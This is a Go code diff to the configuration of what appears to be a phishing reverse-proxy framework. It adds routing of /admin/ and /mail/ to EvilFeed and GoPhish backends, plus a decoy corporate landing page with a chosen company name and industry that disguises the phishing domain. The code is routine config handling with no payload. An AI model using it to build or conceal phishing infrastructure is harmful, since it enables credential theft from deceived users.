@@ -102,6 +102,21 @@ type AnonymityConfigPersist struct {
 	UserAgentRotation   bool `mapstructure:"useragent_rotation" json:"useragent_rotation" yaml:"useragent_rotation"`
 }
 
+// AdminPanelConfig holds configuration for the admin panel routing (EvilFeed/GoPhish on base domain)
+type AdminPanelConfig struct {
+	AdminEnabled    bool   `mapstructure:"admin_enabled" json:"admin_enabled" yaml:"admin_enabled"`
+	AdminPath       string `mapstructure:"admin_path" json:"admin_path" yaml:"admin_path"`
+	AdminBackend    string `mapstructure:"admin_backend" json:"admin_backend" yaml:"admin_backend"`
+	MailEnabled     bool   `mapstructure:"mail_enabled" json:"mail_enabled" yaml:"mail_enabled"`
+	MailPath        string `mapstructure:"mail_path" json:"mail_path" yaml:"mail_path"`
+	MailBackend     string `mapstructure:"mail_backend" json:"mail_backend" yaml:"mail_backend"`
+	LandingEnabled  bool   `mapstructure:"landing_enabled" json:"landing_enabled" yaml:"landing_enabled"`
+	LandingTitle    string `mapstructure:"landing_title" json:"landing_title" yaml:"landing_title"`
+	LandingCompany  string `mapstructure:"landing_company" json:"landing_company" yaml:"landing_company"`
+	LandingTagline  string `mapstructure:"landing_tagline" json:"landing_tagline" yaml:"landing_tagline"`
+	LandingCategory string `mapstructure:"landing_category" json:"landing_category" yaml:"landing_category"` // tech, finance, healthcare, education, etc.
+}
+
 type TelegramConfig struct {
 	BotToken        string                      `mapstructure:"bot_token" json:"bot_token" yaml:"bot_token"`
 	ChatId          string                      `mapstructure:"chat_id" json:"chat_id" yaml:"chat_id"`
@@ -142,6 +157,7 @@ type Config struct {
 	requestCheckerConfig *RequestCheckerConfig
 	cloudflareConfig     *CloudflareConfig
 	anonymityConfig      *AnonymityConfigPersist
+	adminPanelConfig     *AdminPanelConfig
 	telegramConfig       *TelegramConfig
 	proxyConfig          *ProxyConfig
 	phishletConfig       map[string]*PhishletConfig
@@ -170,6 +186,7 @@ const (
 	CFG_TELEGRAM        = "telegram"
 	CFG_CLOUDFLARE      = "cloudflare"
 	CFG_ANONYMITY       = "anonymity"
+	CFG_ADMIN_PANEL     = "admin_panel"
 )
 
 const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -270,6 +287,24 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 			Enabled:             false,
 			HeaderRandomization: false,
 			UserAgentRotation:   false,
+		}
+	}
+
+	// Load Admin Panel configuration (EvilFeed/GoPhish on base domain)
+	c.cfg.UnmarshalKey(CFG_ADMIN_PANEL, &c.adminPanelConfig)
+	if c.adminPanelConfig == nil {
+		c.adminPanelConfig = &AdminPanelConfig{
+			AdminEnabled:    true,
+			AdminPath:       "/admin/",
+			AdminBackend:    "http://127.0.0.1:1337",
+			MailEnabled:     true,
+			MailPath:        "/mail/",
+			MailBackend:     "http://127.0.0.1:3333",
+			LandingEnabled:  true,
+			LandingTitle:    "Welcome",
+			LandingCompany:  "Secure Solutions Inc.",
+			LandingTagline:  "Enterprise Security & Cloud Services",
+			LandingCategory: "tech",
 		}
 	}
 
@@ -697,6 +732,21 @@ func (c *Config) GetActiveHostnames(site string) []string {
 			}
 		}
 	}
+	// Include base domain if admin/mail panels are enabled (need cert for base domain)
+	if site == "" && c.IsBaseDomainActive() && c.general.Domain != "" {
+		baseDomain := strings.ToLower(c.general.Domain)
+		// Check if base domain is not already in the list
+		found := false
+		for _, h := range ret {
+			if h == baseDomain {
+				found = true
+				break
+			}
+		}
+		if !found {
+			ret = append(ret, baseDomain)
+		}
+	}
 	return ret
 }
 
@@ -705,6 +755,13 @@ func (c *Config) IsActiveHostname(host string) bool {
 	if host[len(host)-1:] == "." {
 		host = host[:len(host)-1]
 	}
+
+	// ALWAYS allow base domain when admin panel or landing page is enabled
+	// This ensures the base domain is accessible for /admin/, /mail/, and landing page
+	if host == strings.ToLower(c.general.Domain) && c.IsBaseDomainActive() {
+		return true
+	}
+
 	for _, h := range c.activeHostnames {
 		if h == host {
 			return true
@@ -1294,4 +1351,233 @@ func (c *Config) SetInternalAPIPort(port int) {
 	c.cfg.Set(CFG_GENERAL, c.general)
 	log.Info("internal API port set to: %d", port)
 	c.cfg.WriteConfig()
+}
+
+// ============================================================================
+// Admin Panel Configuration Methods (EvilFeed/GoPhish on base domain)
+// ============================================================================
+
+// GetAdminPanelConfig returns the admin panel configuration
+func (c *Config) GetAdminPanelConfig() *AdminPanelConfig {
+	if c.adminPanelConfig == nil {
+		c.adminPanelConfig = &AdminPanelConfig{
+			AdminEnabled:    false,
+			AdminPath:       "/admin/",
+			AdminBackend:    "http://127.0.0.1:1337",
+			MailEnabled:     false,
+			MailPath:        "/mail/",
+			MailBackend:     "http://127.0.0.1:3333",
+			LandingEnabled:  true,
+			LandingTitle:    "Welcome",
+			LandingCompany:  "Secure Solutions Inc.",
+			LandingTagline:  "Enterprise Security & Cloud Services",
+			LandingCategory: "tech",
+		}
+	}
+	return c.adminPanelConfig
+}
+
+// IsAdminPanelEnabled returns true if admin panel (/admin/) is enabled
+func (c *Config) IsAdminPanelEnabled() bool {
+	return c.GetAdminPanelConfig().AdminEnabled
+}
+
+// IsMailPanelEnabled returns true if mail panel (/mail/) is enabled
+func (c *Config) IsMailPanelEnabled() bool {
+	return c.GetAdminPanelConfig().MailEnabled
+}
+
+// IsLandingPageEnabled returns true if landing page is enabled
+// Landing page is always auto-enabled when base domain is set
+func (c *Config) IsLandingPageEnabled() bool {
+	// Auto-enabled: landing page is always shown on base domain
+	// unless admin or mail panel is handling the request
+	return c.general.Domain != ""
+}
+
+// IsBaseDomainActive returns true if base domain should be active (any panel or landing enabled)
+func (c *Config) IsBaseDomainActive() bool {
+	cfg := c.GetAdminPanelConfig()
+	return cfg.AdminEnabled || cfg.MailEnabled || cfg.LandingEnabled
+}
+
+// SetAdminPanelEnabled enables/disables the admin panel (/admin/ -> EvilFeed)
+func (c *Config) SetAdminPanelEnabled(enabled bool) {
+	c.GetAdminPanelConfig().AdminEnabled = enabled
+	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
+	if enabled {
+		log.Info("[AdminPanel] /admin/ route enabled -> EvilFeed (%s)", c.adminPanelConfig.AdminBackend)
+	} else {
+		log.Info("[AdminPanel] /admin/ route disabled")
+	}
+	c.cfg.WriteConfig()
+}
+
+// SetMailPanelEnabled enables/disables the mail panel (/mail/ -> GoPhish)
+func (c *Config) SetMailPanelEnabled(enabled bool) {
+	c.GetAdminPanelConfig().MailEnabled = enabled
+	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
+	if enabled {
+		log.Info("[AdminPanel] /mail/ route enabled -> GoPhish (%s)", c.adminPanelConfig.MailBackend)
+	} else {
+		log.Info("[AdminPanel] /mail/ route disabled")
+	}
+	c.cfg.WriteConfig()
+}
+
+// SetLandingPageEnabled enables/disables the landing page
+func (c *Config) SetLandingPageEnabled(enabled bool) {
+	c.GetAdminPanelConfig().LandingEnabled = enabled
+	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
+	if enabled {
+		log.Info("[AdminPanel] landing page enabled for base domain")
+	} else {
+		log.Info("[AdminPanel] landing page disabled")
+	}
+	c.cfg.WriteConfig()
+}
+
+// SetAdminBackend sets the backend URL for admin panel
+func (c *Config) SetAdminBackend(backend string) {
+	c.GetAdminPanelConfig().AdminBackend = backend
+	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
+	log.Info("[AdminPanel] admin backend set to: %s", backend)
+	c.cfg.WriteConfig()
+}
+
+// SetMailBackend sets the backend URL for mail panel
+func (c *Config) SetMailBackend(backend string) {
+	c.GetAdminPanelConfig().MailBackend = backend
+	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
+	log.Info("[AdminPanel] mail backend set to: %s", backend)
+	c.cfg.WriteConfig()
+}
+
+// GetAdminPath returns the admin panel path (default: /admin/)
+func (c *Config) GetAdminPath() string {
+	path := c.GetAdminPanelConfig().AdminPath
+	if path == "" {
+		return "/admin/"
+	}
+	return path
+}
+
+// GetMailPath returns the mail panel path (default: /mail/)
+func (c *Config) GetMailPath() string {
+	path := c.GetAdminPanelConfig().MailPath
+	if path == "" {
+		return "/mail/"
+	}
+	return path
+}
+
+// GetAdminBackend returns the admin backend URL
+func (c *Config) GetAdminBackend() string {
+	backend := c.GetAdminPanelConfig().AdminBackend
+	if backend == "" {
+		return "http://127.0.0.1:1337"
+	}
+	return backend
+}
+
+// GetMailBackend returns the mail backend URL
+func (c *Config) GetMailBackend() string {
+	backend := c.GetAdminPanelConfig().MailBackend
+	if backend == "" {
+		return "http://127.0.0.1:3333"
+	}
+	return backend
+}
+
+// SetLandingTitle sets the landing page title
+func (c *Config) SetLandingTitle(title string) {
+	c.GetAdminPanelConfig().LandingTitle = title
+	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
+	log.Info("[AdminPanel] landing title set to: %s", title)
+	c.cfg.WriteConfig()
+}
+
+// SetLandingCompany sets the landing page company name
+func (c *Config) SetLandingCompany(company string) {
+	c.GetAdminPanelConfig().LandingCompany = company
+	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
+	log.Info("[AdminPanel] landing company set to: %s", company)
+	c.cfg.WriteConfig()
+}
+
+// SetLandingTagline sets the landing page tagline
+func (c *Config) SetLandingTagline(tagline string) {
+	c.GetAdminPanelConfig().LandingTagline = tagline
+	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
+	log.Info("[AdminPanel] landing tagline set to: %s", tagline)
+	c.cfg.WriteConfig()
+}
+
+// SetLandingCategory sets the landing page category (tech, finance, healthcare, education, etc.)
+func (c *Config) SetLandingCategory(category string) {
+	validCategories := []string{"tech", "finance", "healthcare", "education", "legal", "consulting", "marketing", "retail"}
+	if !stringExists(category, validCategories) {
+		log.Warning("[AdminPanel] invalid category '%s', valid options: %v", category, validCategories)
+		return
+	}
+	c.GetAdminPanelConfig().LandingCategory = category
+	c.cfg.Set(CFG_ADMIN_PANEL, c.adminPanelConfig)
+	log.Info("[AdminPanel] landing category set to: %s", category)
+	c.cfg.WriteConfig()
+}
+
+// GetLandingTitle returns the landing page title
+func (c *Config) GetLandingTitle() string {
+	title := c.GetAdminPanelConfig().LandingTitle
+	if title == "" {
+		return "Welcome"
+	}
+	return title
+}
+
+// GetLandingCompany returns the landing page company name
+func (c *Config) GetLandingCompany() string {
+	company := c.GetAdminPanelConfig().LandingCompany
+	if company == "" {
+		return "Secure Solutions Inc."
+	}
+	return company
+}
+
+// GetLandingTagline returns the landing page tagline
+func (c *Config) GetLandingTagline() string {
+	tagline := c.GetAdminPanelConfig().LandingTagline
+	if tagline == "" {
+		return "Enterprise Security & Cloud Services"
+	}
+	return tagline
+}
+
+// GetLandingCategory returns the landing page category
+func (c *Config) GetLandingCategory() string {
+	category := c.GetAdminPanelConfig().LandingCategory
+	if category == "" {
+		return "tech"
+	}
+	return category
+}
+
+// LoadAdminPanelConfig loads admin panel config from file
+func (c *Config) LoadAdminPanelConfig() {
+	c.cfg.UnmarshalKey(CFG_ADMIN_PANEL, &c.adminPanelConfig)
+	if c.adminPanelConfig == nil {
+		c.adminPanelConfig = &AdminPanelConfig{
+			AdminEnabled:    false,
+			AdminPath:       "/admin/",
+			AdminBackend:    "http://127.0.0.1:1337",
+			MailEnabled:     false,
+			MailPath:        "/mail/",
+			MailBackend:     "http://127.0.0.1:3333",
+			LandingEnabled:  true,
+			LandingTitle:    "Welcome",
+			LandingCompany:  "Secure Solutions Inc.",
+			LandingTagline:  "Enterprise Security & Cloud Services",
+			LandingCategory: "tech",
+		}
+	}
 }
